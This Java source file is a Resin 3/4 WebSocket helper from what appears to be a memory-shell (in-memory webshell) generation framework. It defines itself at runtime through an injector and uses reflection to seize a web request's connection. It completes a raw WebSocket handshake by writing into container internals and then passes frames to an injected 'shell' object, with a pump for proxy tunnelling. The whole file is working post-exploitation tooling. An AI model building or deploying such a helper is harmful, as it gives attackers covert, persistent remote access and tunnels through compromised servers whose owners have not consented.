package com.reajason.javaweb.memshell.server.resin;

import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InterruptedIOException;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Resin RawWebSocket helper 模板。
 * <p>
 * 生成期由 server 按 {@code <shellClassName>$RawWsHelper} 重命名并嵌入注入器；注入器先
 * defineClass 本类，再实例化 shell。shell 每次握手创建一个 helper 实例，调用
 * {@code helper.equals(new Object[]{request, response, this})} 后由本类接管连接。
 * <p>
 * Resin 4 走 {@code HttpRequest#startDuplex(SocketLinkDuplexListener)}：101 由 servlet
 * 响应写出（容器在 duplex 状态下自动补 {@code Upgrade} / {@code Connection: Upgrade}），
 * 帧数据经 {@code SocketLinkDuplexController} 的读写流收发。
 * <p>
 * Resin 3 没有 WebSocket API，走 {@code HttpResponse#upgradeProtocol(TcpConnectionHandler)}：
 * 由本类代理该接口，在 {@code serviceRead} 里读帧。{@code Connection} 头被
 * {@code setSpecial} 吞掉，必须直接写入 {@code _headerKeys/_headerValues}。
 * <p>
 * 本类只依赖 JDK（目标 JDK 6），不引用任何 servlet/Resin 类型；容器对象一律反射访问，
 * 也不使用内部类，便于 ByteBuddy 只重定义一个类。
 *
 * @author ReaJason
 */
public class ResinRawWsHelper implements Runnable, InvocationHandler {

    private static final String GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final int MAX_MESSAGE_SIZE = 50 * 1024 * 1024;
    private static final int OP_CONT = 0x0;
    private static final int OP_TEXT = 0x1;
    private static final int OP_BINARY = 0x2;
    private static final int OP_CLOSE = 0x8;
    private static final int OP_PING = 0x9;
    private static final int OP_PONG = 0xA;

    private static final int MODE_NONE = 0;
    private static final int MODE_RESIN3 = 1;
    private static final int MODE_RESIN4 = 2;

    private int mode = MODE_NONE;

    private Object controller;
    private Object servletRequest;
    private Object servletResponse;
    private InputStream input;
    private OutputStream output;

    private final Object writeLock = new Object();
    private volatile boolean closed;
    private boolean hijacked;
    private boolean disconnectNotified;

    private Object shell;
    private Method onStart;
    private Method onReadBinary;
    private Method onReadText;
    private Method onDisconnect;

    private InputStream pumpInput;
    private Map attributes;

    public ResinRawWsHelper() {
    }

    /**
     * 注入器到 helper 的唯一入口。返回 true 表示连接已被接管（101 已决定写或已写），
     * 调用方不能再回落到 FilterChain；返回 false 表示尚未接管，可安全 fallback。
     */
    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Object[])) {
            return false;
        }
        Object[] args = (Object[]) obj;
        if (args.length != 3) {
            return false;
        }
        try {
            return connect(args[0], args[1], args[2]);
        } catch (Throwable ignored) {
            return hijacked;
        }
    }

    private boolean connect(Object request, Object response, Object shellObject) throws Exception {
        if (request == null || response == null) {
            return false;
        }
        Object key = invoke(request, "getHeader", new Class[]{String.class}, new Object[]{"Sec-WebSocket-Key"});
        Object method = invoke(request, "getMethod", new Class[0], null);
        if (!(key instanceof String) || !"GET".equalsIgnoreCase(String.valueOf(method))) {
            return false;
        }
        String accept = acceptKey((String) key);
        if (accept == null) {
            return false;
        }
        if (Boolean.TRUE.equals(invoke(response, "isCommitted", new Class[0], null))) {
            return false;
        }

        this.servletRequest = request;
        this.servletResponse = response;
        this.shell = shellObject;
        this.onStart = findMethod(shellObject, "onStart", new Class[]{Object.class});
        this.onReadBinary = findMethod(shellObject, "onReadBinary", new Class[]{Object.class, byte[].class});
        this.onReadText = findMethod(shellObject, "onReadText", new Class[]{Object.class, String.class});
        this.onDisconnect = findMethod(shellObject, "onDisconnect", new Class[]{Object.class});

        Object duplexRequest = findDuplexRequest();
        if (duplexRequest != null) {
            return connectResin4(duplexRequest, accept);
        }
        Object upgradeResponse = findUpgradeResponse();
        if (upgradeResponse != null) {
            return connectResin3(upgradeResponse, accept);
        }
        return false;
    }

    /**
     * Resin 4：startDuplex 之后状态变为 DUPLEX，响应头由容器补 Upgrade/Connection。
     */
    private boolean connectResin4(Object duplexRequest, String accept) throws Exception {
        Method startDuplex = null;
        Class[] parameterTypes = new Class[]{findListenerClass(duplexRequest, "startDuplex")};
        if (parameterTypes[0] == null) {
            return false;
        }
        startDuplex = findDeclaredMethod(duplexRequest.getClass(), "startDuplex", parameterTypes[0]);
        if (startDuplex == null) {
            return false;
        }
        Object listener = newProxy(parameterTypes[0]);
        if (listener == null) {
            return false;
        }
        Object duplexController;
        try {
            duplexController = startDuplex.invoke(duplexRequest, new Object[]{listener});
        } catch (Throwable ignored) {
            return false;
        }
        this.mode = MODE_RESIN4;
        this.controller = duplexController;
        this.hijacked = true;

        try {
            this.output = asOutputStream(invoke(duplexController, "getWriteStream", new Class[0], null));
            setHeader(servletResponse, "Upgrade", "websocket");
            setHeader(servletResponse, "Sec-WebSocket-Accept", accept);
            invokeRequired(servletResponse, "setStatus", new Class[]{int.class}, new Object[]{Integer.valueOf(101)});
            setContentLengthZero(servletResponse);
            flushResponse(servletResponse);
            flushOutput();
        } catch (Throwable t) {
            disconnect();
            return true;
        }
        invokeQuietly(onStart, shell, new Object[]{this});
        return true;
    }

    /**
     * Resin 3：upgradeProtocol 建立 TcpConnectionController 并把状态码改为 101，
     * 但不会写响应头；帧读取在代理的 serviceRead 回调里进行。
     */
    private boolean connectResin3(Object upgradeResponse, String accept) throws Exception {
        Class listenerClass = findListenerClass(upgradeResponse, "upgradeProtocol");
        if (listenerClass == null) {
            return false;
        }
        Method upgradeProtocol = findDeclaredMethod(upgradeResponse.getClass(), "upgradeProtocol", listenerClass);
        if (upgradeProtocol == null) {
            return false;
        }
        Object headerKeys = getField(upgradeResponse, "_headerKeys");
        Object headerValues = getField(upgradeResponse, "_headerValues");
        if (!(headerKeys instanceof List) || !(headerValues instanceof List)) {
            return false;
        }
        Object originalRequest = invoke(upgradeResponse, "getOriginalRequest", new Class[0], null);
        Object connection = invoke(originalRequest, "getConnection", new Class[0], null);
        OutputStream writeStream = asOutputStream(invoke(connection, "getWriteStream", new Class[0], null));
        if (writeStream == null) {
            return false;
        }
        Object listener = newProxy(listenerClass);
        if (listener == null) {
            return false;
        }
        try {
            upgradeProtocol.invoke(upgradeResponse, new Object[]{listener});
        } catch (Throwable ignored) {
            return false;
        }
        this.mode = MODE_RESIN3;
        this.output = writeStream;
        this.hijacked = true;

        try {
            invokeRequired(upgradeResponse, "setStatus", new Class[]{int.class, String.class},
                    new Object[]{Integer.valueOf(101), "Switching Protocols"});
            setHeader(upgradeResponse, "Upgrade", "websocket");
            setHeader(upgradeResponse, "Sec-WebSocket-Accept", accept);
            // Connection 被 setSpecial 当成特殊头吞掉，只能直接补进输出列表
            ((List) headerKeys).add("Connection");
            ((List) headerValues).add("Upgrade");
            flushResponse(upgradeResponse);
            flushOutput();
        } catch (Throwable t) {
            disconnect();
            return true;
        }
        invokeQuietly(onStart, shell, new Object[]{this});
        return true;
    }

    // ---------------------------------------------------------------- 容器回调（动态代理）

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        String name = method.getName();
        if ("equals".equals(name)) {
            return Boolean.valueOf(proxy == (args == null ? null : args[0]));
        }
        if ("hashCode".equals(name)) {
            return Integer.valueOf(System.identityHashCode(proxy));
        }
        if ("toString".equals(name)) {
            return "rawWsHelper";
        }
        if ("onStart".equals(name)) {
            if (args != null && args.length > 0) {
                this.controller = args[0];
                if (this.output == null) {
                    this.output = asOutputStream(invoke(args[0], "getWriteStream", new Class[0], null));
                }
            }
            return null;
        }
        if ("onRead".equals(name)) {
            if (args != null && args.length > 0) {
                this.controller = args[0];
            }
            prepareInput();
            frameLoop();
            return null;
        }
        if ("serviceRead".equals(name)) {
            if (args != null && args.length > 1) {
                this.controller = args[1];
            }
            InputStream readStream = args != null && args.length > 0 ? asInputStream(args[0]) : null;
            if (readStream == null) {
                return Boolean.FALSE;
            }
            this.input = readStream;
            frameLoop();
            return Boolean.FALSE;
        }
        if ("serviceWrite".equals(name)) {
            return Boolean.TRUE;
        }
        if ("onDisconnect".equals(name) || "onTimeout".equals(name)) {
            disconnect();
            return null;
        }
        return null;
    }

    private void prepareInput() {
        if (input != null || controller == null) {
            return;
        }
        this.input = asInputStream(invoke(controller, "getReadStream", new Class[0], null));
    }

    // ---------------------------------------------------------------- 协议

    private void frameLoop() {
        ByteArrayOutputStream fragments = null;
        int fragmentOpcode = -1;
        try {
            while (!closed) {
                int b1 = readWireByte();
                if (b1 == -1) {
                    break;
                }
                boolean fin = (b1 & 0x80) != 0;
                int opcode = b1 & 0x0F;
                if ((b1 & 0x70) != 0) {
                    closeWith(1002, "unexpected reserved bits");
                    return;
                }

                int b2 = readWireByte();
                if (b2 == -1) {
                    break;
                }
                boolean masked = (b2 & 0x80) != 0;
                long length = b2 & 0x7F;
                if (length == 126) {
                    int hi = readWireByte();
                    int lo = readWireByte();
                    if (hi < 0 || lo < 0) {
                        return;
                    }
                    length = ((long) hi << 8) | lo;
                } else if (length == 127) {
                    length = 0;
                    for (int i = 0; i < 8; i++) {
                        int b = readWireByte();
                        if (b < 0) {
                            return;
                        }
                        length = (length << 8) | b;
                    }
                }
                if (length < 0 || length > MAX_MESSAGE_SIZE) {
                    closeWith(1009, "message too big");
                    return;
                }
                if (!masked) {
                    closeWith(1002, "client frame must be masked");
                    return;
                }
                if (opcode >= 0x8 && (!fin || length > 125)) {
                    closeWith(1002, "invalid control frame");
                    return;
                }

                byte[] mask = new byte[4];
                readFully(mask, 0, mask.length);
                byte[] message = readMaskedPayload(length, mask);

                if (opcode == OP_CLOSE) {
                    if (message.length == 1) {
                        closeWith(1002, "invalid close frame");
                        return;
                    }
                    sendFrame(OP_CLOSE, message);
                    disconnect();
                    return;
                }
                if (opcode == OP_PING) {
                    sendFrame(OP_PONG, message);
                    continue;
                }
                if (opcode == OP_PONG) {
                    continue;
                }
                if (opcode == OP_CONT) {
                    if (fragments == null) {
                        closeWith(1002, "unexpected continuation");
                        return;
                    }
                    fragments.write(message);
                    if (fragments.size() > MAX_MESSAGE_SIZE) {
                        closeWith(1009, "message too big");
                        return;
                    }
                    if (fin) {
                        dispatch(fragmentOpcode, fragments.toByteArray());
                        fragments = null;
                        fragmentOpcode = -1;
                    }
                    continue;
                }
                if (opcode == OP_TEXT || opcode == OP_BINARY) {
                    if (fragments != null) {
                        closeWith(1002, "expected continuation");
                        return;
                    }
                    if (fin) {
                        dispatch(opcode, message);
                    } else {
                        fragmentOpcode = opcode;
                        fragments = new ByteArrayOutputStream();
                        fragments.write(message);
                    }
                    continue;
                }
                closeWith(1002, "unknown opcode");
                return;
            }
        } catch (Throwable ignored) {
        } finally {
            disconnect();
        }
    }

    private void dispatch(int opcode, byte[] message) {
        if (opcode == OP_TEXT) {
            invokeQuietly(onReadText, shell, new Object[]{this, new String(message, UTF8)});
        } else {
            invokeQuietly(onReadBinary, shell, new Object[]{this, message});
        }
    }

    public void sendText(String text) {
        sendFrame(OP_TEXT, text.getBytes(UTF8));
    }

    public void sendBinary(byte[] data) {
        sendFrame(OP_BINARY, data);
    }

    /**
     * 供壳主动结束会话（如代理建连失败）：发送 Close 帧并释放底层连接。
     */
    public void close() {
        closeWith(1000, null);
    }

    private void sendFrame(int opcode, byte[] data) {
        synchronized (writeLock) {
            if (closed || output == null) {
                return;
            }
            try {
                int length = data.length;
                byte[] header;
                if (length <= 125) {
                    header = new byte[]{0, (byte) length};
                } else if (length <= 0xFFFF) {
                    header = new byte[]{0, 126, (byte) ((length >>> 8) & 0xFF), (byte) (length & 0xFF)};
                } else {
                    header = new byte[10];
                    header[1] = 127;
                    for (int i = 0; i < 8; i++) {
                        header[9 - i] = (byte) (((long) length >>> (8 * i)) & 0xFF);
                    }
                }
                header[0] = (byte) (0x80 | opcode);
                output.write(header, 0, header.length);
                output.write(data, 0, data.length);
                output.flush();
            } catch (Throwable t) {
                closeConnection();
            }
        }
    }

    private void closeWith(int code, String reason) {
        byte[] reasonBytes = reason == null ? new byte[0] : reason.getBytes(UTF8);
        byte[] data = new byte[2 + reasonBytes.length];
        data[0] = (byte) ((code >>> 8) & 0xFF);
        data[1] = (byte) (code & 0xFF);
        System.arraycopy(reasonBytes, 0, data, 2, reasonBytes.length);
        sendFrame(OP_CLOSE, data);
        disconnect();
    }

    // ---------------------------------------------------------------- 原始字节读写

    private int readWireByte() throws IOException {
        if (input == null) {
            return -1;
        }
        while (!closed) {
            try {
                int value = input.read();
                if (value == -1) {
                    return -1;
                }
                return value & 0xFF;
            } catch (InterruptedIOException e) {
                // 空闲超时：回到循环顶检查 closed，帧内超时则继续等剩余字节
            }
        }
        return -1;
    }

    private void readFully(byte[] buffer, int offset, int length) throws IOException {
        int read = 0;
        while (read < length && !closed) {
            try {
                int count = input.read(buffer, offset + read, length - read);
                if (count < 0) {
                    throw new EOFException("unexpected EOF");
                }
                read += count;
            } catch (InterruptedIOException e) {
                // 同上：超时不等于断链
            }
        }
        if (read < length) {
            throw new EOFException("connection closed");
        }
    }

    /**
     * 分块读取并解除掩码，避免为大帧一次性分配整段缓冲；掩码偏移按全局位置计算。
     */
    private byte[] readMaskedPayload(long length, byte[] mask) throws IOException {
        int total = (int) length;
        int chunkSize = Math.min(total, 8192);
        ByteArrayOutputStream out = new ByteArrayOutputStream(chunkSize);
        byte[] chunk = new byte[chunkSize];
        int received = 0;
        while (received < total) {
            int n = Math.min(chunkSize, total - received);
            readFully(chunk, 0, n);
            for (int i = 0; i < n; i++) {
                chunk[i] = (byte) (chunk[i] ^ mask[(received + i) % 4]);
            }
            out.write(chunk, 0, n);
            received += n;
        }
        return out.toByteArray();
    }

    private void closeConnection() {
        if (closed) {
            return;
        }
        closed = true;
        Object current = controller;
        if (current != null) {
            invoke(current, "close", new Class[0], null);
            return;
        }
        try {
            if (output != null) {
                output.close();
            }
        } catch (Throwable ignored) {
        }
        try {
            if (input != null) {
                input.close();
            }
        } catch (Throwable ignored) {
        }
    }

    private void disconnect() {
        if (disconnectNotified || !hijacked) {
            return;
        }
        disconnectNotified = true;
        invokeQuietly(onDisconnect, shell, new Object[]{this});
        closeConnection();
    }

    // ---------------------------------------------------------------- 属性与泵送

    public Object getAttribute(String name) {
        Map map = attributes;
        return map == null ? null : map.get(name);
    }

    public void setAttribute(String name, Object value) {
        if (attributes == null) {
            attributes = new HashMap();
        }
        if (value == null) {
            attributes.remove(name);
        } else {
            attributes.put(name, value);
        }
    }

    /**
     * 为 Proxy 壳提供目标端到客户端的异步泵送。
     */
    public void startPump(InputStream targetInput) {
        if (targetInput == null) {
            return;
        }
        this.pumpInput = targetInput;
        Thread thread = new Thread(this, "resin-rawws-pump");
        thread.setDaemon(true);
        thread.setContextClassLoader(getClass().getClassLoader());
        thread.start();
    }

    @Override
    public void run() {
        InputStream targetInput = pumpInput;
        if (targetInput == null) {
            return;
        }
        byte[] buffer = new byte[8192];
        try {
            while (!closed) {
                int count = targetInput.read(buffer);
                if (count == -1) {
                    break;
                }
                if (count > 0) {
                    byte[] data = new byte[count];
                    System.arraycopy(buffer, 0, data, 0, count);
                    sendBinary(data);
                }
            }
        } catch (Throwable ignored) {
        }
        closeWith(1000, null);
    }

    // ---------------------------------------------------------------- 容器对象查找

    /**
     * Resin 4：过滤器的 request 是 HttpServletRequestImpl，真正的 startDuplex 在
     * {@code _request} 指向的 HttpRequest 上；外面还可能套了 servlet wrapper。
     */
    private Object findDuplexRequest() {
        Object current = servletRequest;
        for (int i = 0; i < 8 && current != null; i++) {
            Class listenerClass = findListenerClass(current, "startDuplex");
            if (listenerClass != null) {
                return current;
            }
            Object next = unwrap(current, "_request");
            if (next == null) {
                next = unwrap(current, "request");
            }
            if (next == null) {
                next = invoke(current, "getRequest", new Class[0], null);
            }
            if (next == null || next == current) {
                return null;
            }
            current = next;
        }
        return null;
    }

    /**
     * Resin 3：过滤器的 response 通常就是 HttpResponse；wrapper 用 _response/response 串起来。
     */
    private Object findUpgradeResponse() {
        Object current = servletResponse;
        for (int i = 0; i < 8 && current != null; i++) {
            Class listenerClass = findListenerClass(current, "upgradeProtocol");
            if (listenerClass != null) {
                return current;
            }
            Object next = unwrap(current, "_response");
            if (next == null) {
                next = unwrap(current, "response");
            }
            if (next == null) {
                next = invoke(current, "getResponse", new Class[0], null);
            }
            if (next == null || next == current) {
                return null;
            }
            current = next;
        }
        return null;
    }

    private static Object unwrap(Object target, String name) {
        Object value = getField(target, name);
        return value == target ? null : value;
    }

    /**
     * 按方法名找单参数入口，并返回参数接口（Resin 3 的 TcpConnectionHandler /
     * Resin 4 的 SocketLinkDuplexListener）；按接口名后缀匹配，避免把同名方法认错。
     */
    private static Class findListenerClass(Object target, String methodName) {
        String suffix = "startDuplex".equals(methodName)
                ? "SocketLinkDuplexListener" : "TcpConnectionHandler";
        try {
            Method[] methods = target.getClass().getMethods();
            for (int i = 0; i < methods.length; i++) {
                Method method = methods[i];
                if (!methodName.equals(method.getName())) {
                    continue;
                }
                Class[] types = method.getParameterTypes();
                if (types.length == 1 && types[0].isInterface()
                        && types[0].getName().endsWith(suffix)) {
                    return types[0];
                }
            }
        } catch (Throwable ignored) {
        }
        return null;
    }

    private static Method findDeclaredMethod(Class type, String name, Class parameterType) {
        try {
            return type.getMethod(name, new Class[]{parameterType});
        } catch (Throwable ignored) {
            return null;
        }
    }

    private Object newProxy(Class listenerClass) {
        try {
            return Proxy.newProxyInstance(listenerClass.getClassLoader(),
                    new Class[]{listenerClass}, this);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void setHeader(Object response, String name, String value) throws Exception {
        invokeRequired(response, "setHeader",
                new Class[]{String.class, String.class}, new Object[]{name, value});
    }

    private static void setContentLengthZero(Object response) throws Exception {
        invokeRequired(response, "setContentLength",
                new Class[]{int.class}, new Object[]{Integer.valueOf(0)});
    }

    private static void flushResponse(Object response) throws Exception {
        Method flushBuffer = findMethod(response, "flushBuffer", new Class[0]);
        if (flushBuffer != null) {
            flushBuffer.invoke(response, new Object[0]);
            return;
        }
        Object stream = invokeRequired(response, "getOutputStream", new Class[0], null);
        invokeRequired(stream, "flush", new Class[0], null);
    }

    private void flushOutput() {
        if (output != null) {
            try {
                output.flush();
            } catch (Throwable ignored) {
            }
        }
    }

    private static InputStream asInputStream(Object value) {
        return value instanceof InputStream ? (InputStream) value : null;
    }

    private static OutputStream asOutputStream(Object value) {
        return value instanceof OutputStream ? (OutputStream) value : null;
    }

    // ---------------------------------------------------------------- 反射工具

    private static Object getField(Object target, String name) {
        if (target == null) {
            return null;
        }
        Class clazz = target.getClass();
        while (clazz != null && clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            } catch (Throwable ignored) {
                return null;
            }
        }
        return null;
    }

    private static Object invoke(Object target, String name, Class[] parameterTypes, Object[] args) {
        if (target == null) {
            return null;
        }
        try {
            Method method = target.getClass().getMethod(name, parameterTypes);
            return method.invoke(target, args);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static Object invokeRequired(Object target, String name, Class[] parameterTypes, Object[] args)
            throws Exception {
        if (target == null) {
            throw new IOException("target unavailable for " + name);
        }
        Method method = target.getClass().getMethod(name, parameterTypes);
        return method.invoke(target, args);
    }

    private static Method findMethod(Object target, String name, Class[] parameterTypes) {
        try {
            return target.getClass().getMethod(name, parameterTypes);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void invokeQuietly(Method method, Object target, Object[] args) {
        if (method == null) {
            return;
        }
        try {
            method.invoke(target, args);
        } catch (Throwable ignored) {
        }
    }

    private static String acceptKey(String key) {
        try {
            MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
            return base64Encode(sha1.digest((key + GUID).getBytes(UTF8)));
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String base64Encode(byte[] data) {
        try {
            Class base64Class = Class.forName("java.util.Base64");
            Object encoder = base64Class.getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class})
                    .invoke(encoder, new Object[]{data});
        } catch (Throwable ignored) {
        }
        try {
            Class encoderClass = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = encoderClass.newInstance();
            String value = (String) encoderClass.getMethod("encode", new Class[]{byte[].class})
                    .invoke(encoder, new Object[]{data});
            return value.replace("\n", "").replace("\r", "");
        } catch (Throwable ignored) {
            return null;
        }
    }
}
